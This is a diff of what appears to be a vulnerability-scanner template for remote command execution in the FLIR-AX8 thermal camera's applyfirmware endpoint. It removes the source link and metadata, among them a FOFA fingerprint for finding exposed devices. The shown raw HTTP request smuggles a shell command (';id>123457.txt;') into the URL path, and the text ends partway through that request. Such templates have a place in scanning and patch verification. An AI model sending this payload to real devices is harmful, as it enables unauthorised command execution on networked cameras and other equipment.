@@ -3,12 +3,8 @@ info:
   name: FLIR-AX8热成像仪applyfirmware存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yd92larfl7cy63tr'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yd92larfl7cy63tr
-    fofa: web.icon=="f4370ff0b4763e18159cd7cdf36a4542"
 http:
 - raw:
   - 'GET /settings/applyfirmware/;id>123457.txt;/false HTTP/1.1
